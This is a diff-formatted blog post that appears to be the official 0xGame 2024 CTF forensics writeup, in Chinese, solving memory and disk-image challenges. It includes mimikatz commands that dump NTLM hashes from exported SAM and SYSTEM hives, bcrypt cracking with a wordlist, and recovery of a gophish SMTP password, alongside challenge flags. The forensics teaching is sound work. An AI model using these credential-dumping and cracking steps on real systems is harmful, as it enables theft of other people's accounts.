+<h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="画画的baby"><a href="#画画的baby" class="headerlink" title="画画的baby"></a>画画的baby</h3><p>附件给了一个内存文件，本题直接用volatility2或volatility3都能完成</p>
 <p>volatility2：</p>
 <p>先找到内存的profile：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f painting.raw imageinfo</span><br></pre></td></tr></table></figure>
+
 <p>之后经过一些尝试，在查看进程的时候可以发现有一个<code>mspaint.exe</code>的进程，查阅资料可以知道这是windows自带的一个画图软件：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f painting.raw --profile=Win10x64_19041 pslist</span><br><span class="line">......</span><br><span class="line">0xffffe70970c0c340 mspaint.exe            5372   3912      7        0      1      0 2024-09-06 14:36:00 UTC+0000</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
 <p>把对应的进程提取到当前目录下：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f painting.raw --profile=Win10x64_19041 memdump -p 3912 -D ./</span><br></pre></td></tr></table></figure>
+
 <p>改后缀为<code>.data</code>，再用gimp打开调调宽高和位移就能看到当时的画：</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730130638260-0f5f65e1-33f1-4fb8-be8e-7e4d29b0c1ab.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130638260-0f5f65e1-33f1-4fb8-be8e-7e4d29b0c1ab.png" alt="img"></p>
 <p>volatility3:</p>
 <p>操作其实都差不多，不过volatility3不需要指定windows的profile：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f painting.raw windows.pslist</span><br><span class="line">......</span><br><span class="line">5372    3912    mspaint.exe     0xe70970c0c340  7       -       1       False   2024-09-06 14:36:00.000000      N/A     Disabled</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
 <p>再把进程提取到当前目录下：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f painting.raw windows.memmap --pid 5372 --dump</span><br></pre></td></tr></table></figure>
+
 <p>gimp调位移和宽高：</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730130638768-b236d4dc-31cf-48b1-9f8a-c25f92b01f43.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130638768-b236d4dc-31cf-48b1-9f8a-c25f92b01f43.png" alt="img"></p>
 <p>实际上，这几题如果用取证大师软件自动取证的话会方便许多，但出题人的预期是希望大家也能了解了解如何手动去进行这些取证，因此下面会放取证大师和手动取证两种做法。当然手动取证除了下面给出的方法以外还有很多，欢迎师傅们前来探讨。</p>
-<h3 id="fbi-open-the-door-1">FBI Open The Door!! 1*</h3>
-<blockquote>
+<h3 id="FBI-Open-The-Door-1"><a href="#FBI-Open-The-Door-1" class="headerlink" title="FBI Open The Door!! 1*"></a>FBI Open The Door!! 1*</h3><blockquote>
 <p>实际上，这几题如果用取证大师软件自动取证的话会方便许多，但出题人的预期是希望大家也能了解了解如何手动去进行这些取证，因此下面会放取证大师和手动取证两种做法。当然手动取证除了下面给出的方法以外还有很多，欢迎师傅们前来探讨。</p>
 </blockquote>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805644424-a5f29b98-5285-4776-8008-70a6ff866431.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805644424-a5f29b98-5285-4776-8008-70a6ff866431.png" alt="img"></p>
 <p>将检材下载下来求一下SHA256校验值即可</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805644383-8db2fe63-3e4d-4480-a4c9-0a65180fc34c.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805644383-8db2fe63-3e4d-4480-a4c9-0a65180fc34c.png" alt="img"></p>
 <p>0xGame{6d393b09ac01accf27bce07a9c07f5721b9e1e1fd5de1cc8cc1a2581a43e68f5}</p>
-<h3 id="fbi-open-the-door-2">FBI Open The Door!! 2*</h3>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805644457-004db25d-16f6-4d8d-8f42-60ad7bc34975.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<h4 id="法一">法一</h4>
-<p>取证大师一把梭</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805644587-a13ec229-1b63-402a-9c66-7e8b1699bab8.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<h3 id="FBI-Open-The-Door-2"><a href="#FBI-Open-The-Door-2" class="headerlink" title="FBI Open The Door!! 2*"></a>FBI Open The Door!! 2*</h3><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805644457-004db25d-16f6-4d8d-8f42-60ad7bc34975.png" alt="img"></p>
+<h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p>取证大师一把梭</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805644587-a13ec229-1b63-402a-9c66-7e8b1699bab8.png" alt="img"></p>
 <p>0xGame{F1sh1ng-s3v3r}</p>
-<h4 id="法二">法二</h4>
-<p>使用FTK Imager打开：file--&gt;Add Evidence Item--&gt;Image
-File--&gt;Browse选择文件--&gt;Finish</p>
-<p>在C:.evtx</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805644955-c86b739b-09d8-4cb9-85ae-598e9ba37364.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>使用FTK Imager打开：file–&gt;Add Evidence Item–&gt;Image File–&gt;Browse选择文件–&gt;Finish</p>
+<p>在C:\Windows\System32\winevt\Logs路径下找到系统日志system.evtx </p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805644955-c86b739b-09d8-4cb9-85ae-598e9ba37364.png" alt="img"></p>
 <p>打开日志文件，查看事件ID为6011的日志，发现有一条修改主机名的记录，得到主机名</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805644949-c913143e-9bb0-4a8b-b64f-b09722b9b40c.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805644949-c913143e-9bb0-4a8b-b64f-b09722b9b40c.png" alt="img"></p>
 <p>0xGame{F1sh1ng-s3v3r}</p>
-<h3 id="fbi-open-the-door-3">FBI Open The Door!! 3*</h3>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805645036-1162dc1d-5338-4541-944c-92d54a394d7c.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<h4 id="法一-1">法一</h4>
-<p>取证大师可以直接梭出用户St5rr的NTLM hash</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805644951-7dacc63c-5453-4859-b50f-90cd69df1225.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<h3 id="FBI-Open-The-Door-3"><a href="#FBI-Open-The-Door-3" class="headerlink" title="FBI Open The Door!! 3*"></a>FBI Open The Door!! 3*</h3><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805645036-1162dc1d-5338-4541-944c-92d54a394d7c.png" alt="img"></p>
+<h4 id="法一-1"><a href="#法一-1" class="headerlink" title="法一"></a>法一</h4><p>取证大师可以直接梭出用户St5rr的NTLM hash</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805644951-7dacc63c-5453-4859-b50f-90cd69df1225.png" alt="img"></p>
 <p>cmd5上查一下就有</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805645161-02a54f7a-e6c8-460d-87a9-ccd73b41ada9.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805645161-02a54f7a-e6c8-460d-87a9-ccd73b41ada9.png" alt="img"></p>
 <p>0xGame{zaq!xsw@}</p>
-<h4 id="法二-1">法二</h4>
-<p>用ftk，在C:，导出</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805645524-1f1b45f0-56ca-41f7-82f9-adf7dc9b9922.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805645572-a6b82b41-3ca7-45a3-81dd-015d6c4a93c2.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>接下来使用一个叫作<a
-target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>的工具提取NTLM
-Hash。</p>
-<p>运行的时候记得以管理员权限运行，然后依次运行下面两行神奇命令就能得到用户的NTLM
-Hash。</p>
+<h4 id="法二-1"><a href="#法二-1" class="headerlink" title="法二"></a>法二</h4><p>用ftk，在C:\Windows\System32\config下找到SYSTEM和SAM两个文件，导出</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805645524-1f1b45f0-56ca-41f7-82f9-adf7dc9b9922.png" alt="img"></p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805645572-a6b82b41-3ca7-45a3-81dd-015d6c4a93c2.png" alt="img"></p>
+<p>接下来使用一个叫作<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>的工具提取NTLM Hash。</p>
+<p>运行的时候记得以管理员权限运行，然后依次运行下面两行神奇命令就能得到用户的NTLM Hash。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::sam /sam:SAM /system:SYSTEM</span><br></pre></td></tr></table></figure>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805645600-dfd01aaa-fe3f-49ec-baed-cb2db86992ba.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805645600-dfd01aaa-fe3f-49ec-baed-cb2db86992ba.png" alt="img"></p>
 <p>查cmd5</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805645588-e179f20c-9aa3-47c7-876a-706c5b93fff7.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805645588-e179f20c-9aa3-47c7-876a-706c5b93fff7.png" alt="img"></p>
 <p>0xGame{zaq!xsw@}</p>
-<h3 id="fbi-open-the-door-4">FBI Open The Door!! 4*</h3>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805645621-1c89dc55-624d-4dfa-bc08-e5981a7a1c49.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<h4 id="法一-2">法一</h4>
-<p>取证大师一把梭</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805646098-7ea3410c-3834-4fca-ae3a-2cd0e90ecd5d.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<h3 id="FBI-Open-The-Door-4"><a href="#FBI-Open-The-Door-4" class="headerlink" title="FBI Open The Door!! 4*"></a>FBI Open The Door!! 4*</h3><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805645621-1c89dc55-624d-4dfa-bc08-e5981a7a1c49.png" alt="img"></p>
+<h4 id="法一-2"><a href="#法一-2" class="headerlink" title="法一"></a>法一</h4><p>取证大师一把梭</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805646098-7ea3410c-3834-4fca-ae3a-2cd0e90ecd5d.png" alt="img"></p>
 <p>0xGame{2024-10-23 14:50:40}</p>
-<h4 id="法二-2">法二</h4>
-<p>用ftk，在C:，导出</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805646126-93c4cf47-8e2a-4b30-9df9-6794d706d54c.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<h4 id="法二-2"><a href="#法二-2" class="headerlink" title="法二"></a>法二</h4><p>用ftk，在C:\Windows\System32\config下找到SOFTWARE，导出</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805646126-93c4cf47-8e2a-4b30-9df9-6794d706d54c.png" alt="img"></p>
 <p>用kali自带的chntpw查看，用下面的两条奇妙命令即可</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chntpw -e SOFTWARE</span><br><span class="line">ls Microsoft\Windows NT\CurrentVersion</span><br></pre></td></tr></table></figure>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805646207-1cd1c29a-eb21-446c-a849-167c74cfba77.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>可以看到InstallDate，是以时间戳的形式表示的，使用<a
-target="_blank" rel="noopener" href="https://tool.lu/timestamp/">在线工具</a>进行转换，得到系统安装时间</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805646152-98b761fc-391b-4b82-b6d4-c5bc203d4450.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805646207-1cd1c29a-eb21-446c-a849-167c74cfba77.png" alt="img"></p>
+<p>可以看到InstallDate，是以时间戳的形式表示的，使用<a target="_blank" rel="noopener external nofollow noreferrer" href="https://tool.lu/timestamp/">在线工具</a>进行转换，得到系统安装时间</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805646152-98b761fc-391b-4b82-b6d4-c5bc203d4450.png" alt="img"></p>
 <p>0xGame{2024-10-23 14:50:40}</p>
-<h3 id="fbi-open-the-door-5">FBI Open The Door!! 5*</h3>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805646135-feb24c6a-7809-48eb-a6aa-b769b132ae95.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>可以在C:，将其导出。取证大师中的话可以更快找到这个路径。</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805646972-8ee81990-54af-4552-adab-e011c4277820.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<h3 id="FBI-Open-The-Door-5"><a href="#FBI-Open-The-Door-5" class="headerlink" title="FBI Open The Door!! 5*"></a>FBI Open The Door!! 5*</h3><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805646135-feb24c6a-7809-48eb-a6aa-b769b132ae95.png" alt="img"></p>
+<p>可以在C:\Windows\Temp路径下找到gophish文件夹，将其导出。取证大师中的话可以更快找到这个路径。</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805646972-8ee81990-54af-4552-adab-e011c4277820.png" alt="img"></p>
 <p>在接下来的步骤前，建议去了解一下gophish</p>
 <p>文件夹中有个gophish.db，用navicat看一下</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805646866-9fc719e8-ac25-4f96-acda-6c0254776258.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805646866-9fc719e8-ac25-4f96-acda-6c0254776258.png" alt="img"></p>
 <p>在smtp表中找到password字段，这就是smtp授权码</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805646930-3b5e372b-2c80-42c0-9df6-5494a3c31fef.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805646930-3b5e372b-2c80-42c0-9df6-5494a3c31fef.png" alt="img"></p>
 <p>0xGame{wpdqlnyvetqyddce}</p>
-<h3 id="fbi-open-the-door-6">FBI Open The Door!! 6*</h3>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805646951-f88bd439-01b0-4467-a5bd-e4aa03d7e50f.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<h3 id="FBI-Open-The-Door-6"><a href="#FBI-Open-The-Door-6" class="headerlink" title="FBI Open The Door!! 6*"></a>FBI Open The Door!! 6*</h3><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805646951-f88bd439-01b0-4467-a5bd-e4aa03d7e50f.png" alt="img"></p>
 <p>接上一题，查看users表中的hash字段，这就是登录密码的哈希</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805647059-85491922-b06f-4245-b4b3-12915db1c3a9.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>网上搜索一下可以知道，这是bcrypt
-hash，明文肯定是弱口令，用hashcat或者jtr爆破一下就行，下面用jtr。将哈希值存成一个名为1.hash的文件，字典使用rockyou.txt。</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805647497-a3ab4d75-c4bc-4aa2-9172-c4b737789ed9.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805647059-85491922-b06f-4245-b4b3-12915db1c3a9.png" alt="img"></p>
+<p>网上搜索一下可以知道，这是bcrypt hash，明文肯定是弱口令，用hashcat或者jtr爆破一下就行，下面用jtr。将哈希值存成一个名为1.hash的文件，字典使用rockyou.txt。</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805647497-a3ab4d75-c4bc-4aa2-9172-c4b737789ed9.png" alt="img"></p>
 <p>0xGame{qwertyuiop}</p>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://www.blog.st4rr.top">St4rr</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://www.blog.st4rr.top/posts/511d172f/">https://www.blog.st4rr.top/posts/511d172f/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener external nofollow noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Writeup/">Writeup</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/0xGame/">0xGame</a></div><div class="post_share"><div class="social-share" data-image="/img/grey_bwm.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/df428ec6/" title="极客大挑战2024 Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">极客大挑战2024 Writeup</div></div></a></div><div class="next-post pull-right"><a href="/posts/829c310c/" title="强网杯2024 Misc 谍影重重5.0 Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">强网杯2024 Misc 谍影重重5.0 Writeup</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/posts/56d4296b/" title="盘古石杯2025初赛 Writeup+复现（断更中）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-20</div><div class="title">盘古石杯2025初赛 Writeup+复现（断更中）</div></div></a></div><div><a href="/posts/58e12fb0/" title="0xGame2023 Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-24</div><div class="title">0xGame2023 Writeup</div></div></a></div><div><a href="/posts/29fccdc3/" title="ACTF2025 Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-27</div><div class="title">ACTF2025 Writeup</div></div></a></div><div><a href="/posts/e41c2619/" title="2024暑假偷偷练习CTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-28</div><div class="title">2024暑假偷偷练习CTF</div></div></a></div><div><a href="/posts/fabac5e4/" title="BeginCTF2024 Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-06</div><div class="title">BeginCTF2024 Writeup</div></div></a></div><div><a href="/posts/f0c8bac7/" title="BuildCTF2024 Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-29</div><div class="title">BuildCTF2024 Writeup</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/grey_bwm.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">St4rr</div><div class="author-info__description">想学一门技术(</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">64</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">54</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/123Starr"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">由于博客内部路径更新，之前的一些评论及博客查看次数可能被吞:( 另外如果想联系作者，请移步至Comment板块留言:)</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xgame2048"><span class="toc-number">1.1.</span> <span class="toc-text">0xGame2048*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E6%98%8E%E4%B8%80%E6%9A%97"><span class="toc-number">1.2.</span> <span class="toc-text">一明一暗*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="toc-number">1.3.</span> <span class="toc-text">加密的压缩包？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E7%9A%84%E4%B8%96%E7%95%8C%E5%9F%BA%E5%B2%A9%E7%89%88"><span class="toc-number">1.4.</span> <span class="toc-text">我的世界基岩版(?*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%9C%E5%91%9C%E5%91%9C%E6%88%91%E5%86%8D%E4%B9%9F%E4%B8%8D%E6%95%A2%E4%B9%B1%E7%82%B9%E4%BA%86"><span class="toc-number">1.5.</span> <span class="toc-text">呜呜呜~我再也不敢乱点了*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E5%8F%AB%E6%9B%BC%E6%B3%A2"><span class="toc-number">1.6.</span> <span class="toc-text">我叫曼波</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E5%91%8A%E5%93%88%E5%9F%BA%E7%B1%B3"><span class="toc-number">1.7.</span> <span class="toc-text">报告哈基米</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A5%9E%E7%A7%98%E7%94%B5%E6%B3%A2"><span class="toc-number">1.8.</span> <span class="toc-text">神秘电波*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8%E5%8D%97%E9%82%AE%E5%BD%93ctf%E5%A4%A7%E7%8E%8B"><span class="toc-number">1.9.</span> <span class="toc-text">重生之我在南邮当CTF大王</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crazy-thursday-v-me-50-btc"><span class="toc-number">1.10.</span> <span class="toc-text">Crazy Thursday v me 50 btc*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#encrypted-file"><span class="toc-number">1.11.</span> <span class="toc-text">Encrypted file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#untouchable-flag"><span class="toc-number">1.12.</span> <span class="toc-text">Untouchable flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#osint"><span class="toc-number">2.</span> <span class="toc-text">OSINT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%92%E8%81%94%E7%BD%91%E7%9A%84%E4%B8%80%E8%A7%92"><span class="toc-number">2.1.</span> <span class="toc-text">互联网的一角*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%99%E6%88%91%E5%B9%B2%E5%93%AA%E6%9D%A5%E4%BA%86%E8%BF%99%E8%BF%98%E6%98%AF%E5%9B%BD%E5%86%85%E5%90%97"><span class="toc-number">2.2.</span> <span class="toc-text">给我干哪来了，这还是国内吗？？*</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#blockchain"><span class="toc-number">3.</span> <span class="toc-text">Blockchain</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%82%98%E4%B8%8A%E9%93%BE"><span class="toc-number">3.1.</span> <span class="toc-text">肘，上链！*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#theft"><span class="toc-number">3.2.</span> <span class="toc-text">theft</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E5%93%AA%E6%9D%A5%E9%82%A3%E4%B9%88%E5%A4%9A%E8%87%AD%E9%92%B1"><span class="toc-number">3.3.</span> <span class="toc-text">我哪来那么多臭钱？？*</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#forensics"><span class="toc-number">4.</span> <span class="toc-text">Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%BB%E7%94%BB%E7%9A%84baby"><span class="toc-number">4.1.</span> <span class="toc-text">画画的baby</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fbi-open-the-door-1"><span class="toc-number">4.2.</span> <span class="toc-text">FBI Open The Door!! 1*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fbi-open-the-door-2"><span class="toc-number">4.3.</span> <span class="toc-text">FBI Open The Door!! 2*</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80"><span class="toc-number">4.3.1.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C"><span class="toc-number">4.3.2.</span> <span class="toc-text">法二</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fbi-open-the-door-3"><span class="toc-number">4.4.</span> <span class="toc-text">FBI Open The Door!! 3*</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80-1"><span class="toc-number">4.4.1.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C-1"><span class="toc-number">4.4.2.</span> <span class="toc-text">法二</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fbi-open-the-door-4"><span class="toc-number">4.5.</span> <span class="toc-text">FBI Open The Door!! 4*</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80-2"><span class="toc-number">4.5.1.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C-2"><span class="toc-number">4.5.2.</span> <span class="toc-text">法二</span></a></li></ol></li><li 